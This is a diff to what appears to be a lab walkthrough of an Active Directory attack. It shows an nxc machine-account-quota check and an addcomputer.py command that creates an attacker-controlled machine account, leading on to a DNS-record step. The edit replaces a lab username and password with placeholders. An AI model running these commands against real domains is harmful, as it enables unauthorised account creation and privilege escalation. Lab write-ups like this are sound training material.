@@ -44,7 +44,7 @@ nxc ldap <DC_IP> -u $USER -p '$PASS' -M maq
 First creating a machine account with `addcomputer.py`
 
 ```bash
-addcomputer.py -computer-name bsec -computer-pass 'BehindSecurity@2025' -dc-ip $DC_IP delegate.vl/N.Thompson:'KALEB_2341'
+addcomputer.py -computer-name bsec -computer-pass 'BehindSecurity@2025' -dc-ip $DC_IP $DOMAIN/$USER:'$PASS'
 ```
 
 ## **Step 2: Adding the DNS Record**
